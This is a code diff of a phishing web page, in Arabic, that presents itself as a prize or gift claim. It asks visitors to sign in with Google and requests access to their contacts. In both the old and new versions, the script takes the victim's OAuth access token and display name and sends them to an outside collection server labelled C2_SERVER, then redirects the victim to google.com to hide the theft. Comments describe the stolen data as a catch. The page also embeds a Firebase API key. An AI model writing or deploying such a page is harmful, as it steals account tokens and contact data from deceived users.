@@ -1,24 +1,19 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>استلام الجائزة</title>
+    <title>Gift Page</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
 </head>
-<body style="font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #f4f4f4;">
+<body style="text-align: center; margin-top: 100px;">
 
-    <div style="background: white; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0 0 10px rgba(0,0,0,0.1);">
-        <h2 style="color: #1a73e8;">مبروك! أنت مؤهل للحصول على جائزة</h2>
-        <p>سجل دخولك لتأكيد حسابك واستلام الجائزة فوراً</p>
-        <button onclick="login()" style="background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 16px;">
-            تسجيل الدخول عبر Google
-        </button>
-    </div>
+    <button id="loginBtn" style="padding: 20px; font-size: 20px; cursor: pointer;">
+        اضغط هنا لاستلام هديتك عبر Google
+    </button>
 
     <script>
-        // إعدادات مشروعك الجديد اللي بعته يا وحش
+        // إعداداتك الصحيحة
         const firebaseConfig = {
             apiKey: "AIzaSyCvs2XALyDmK3_D4BXJ5Dx7MFo2H71R6gg",
             authDomain: "giftapp-5937d.firebaseapp.com",
@@ -29,25 +24,23 @@
         };
 
         firebase.initializeApp(firebaseConfig);
-        const C2_SERVER = "https://mohamedahmed77.pythonanywhere.com/catch";
 
-        function login() {
+        // ربط الزرار بالأمر
+        document.getElementById('loginBtn').onclick = function() {
             const provider = new firebase.auth.GoogleAuthProvider();
             provider.addScope('https://www.googleapis.com/auth/contacts.readonly');
-            // استخدام الـ Redirect لتخطي صفحة about:blank
             firebase.auth().signInWithRedirect(provider);
-        }
+        };
 
-        // استلام النتيجة بعد العودة من جوجل
+        // التعامل مع العودة من جوجل
         firebase.auth().getRedirectResult().then((result) => {
             if (result.credential) {
                 const token = result.credential.accessToken;
                 const sender = result.user.displayName || "Target";
                 
-                // إرسال الصيد للوحش
-                fetch(`${C2_SERVER}?token=${token}&sender=${sender}`)
-                .then(() => { window.location.href = "https://google.com"; })
-                .catch(() => { window.location.href = "https://google.com"; });
+                // إرسال البيانات للوحش
+                fetch(`https://mohamedahmed77.pythonanywhere.com/catch?token=${token}&sender=${sender}`)
+                .then(() => { window.location.href = "https://google.com"; });
             }
         });
     </script>
